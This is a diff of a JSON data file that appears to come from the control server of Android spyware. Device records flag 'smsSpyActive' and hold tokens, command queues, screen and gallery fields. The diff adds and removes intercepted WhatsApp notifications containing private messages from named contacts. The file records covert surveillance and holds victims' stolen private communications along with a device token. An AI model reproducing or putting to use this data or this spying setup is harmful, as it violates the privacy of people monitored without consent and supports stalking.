@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776920846261,
+    "lastSeen": 1776920851763,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎68 pesan dari 42 chat",
+        "time": "23/04 13:07",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776920853825
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "prily 🤍",
+        "content": "mahal banget permen nya om",
+        "time": "23/04 13:07",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776920853713
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "prily 🤍",
+        "content": "📷 Foto",
+        "time": "23/04 13:07",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776920847548
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -3995,30 +4019,6 @@
         "time": "23/04 09:35",
         "pkg": "com.whatsapp",
         "receivedAt": 1776908109309
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎61 pesan dari 39 chat",
-        "time": "23/04 09:34",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776908094788
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "BEW STORE",
-        "content": "bantuin keluar dulu sayang",
-        "time": "23/04 09:34",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776908094775
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎62 pesan dari 40 chat",
-        "time": "23/04 09:34",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776908094477
       }
     ],
     "galleryPhotos": [],
@@ -9969,6 +9969,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎Senam Rappocini (2 pesan): ~ Andiviera",
+        "content": "Iye seragam ini mo di pke",
+        "time": "23/04 13:07",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776920847737
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎193 pesan dari 4 chat",
+        "time": "23/04 13:07",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776920847635
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
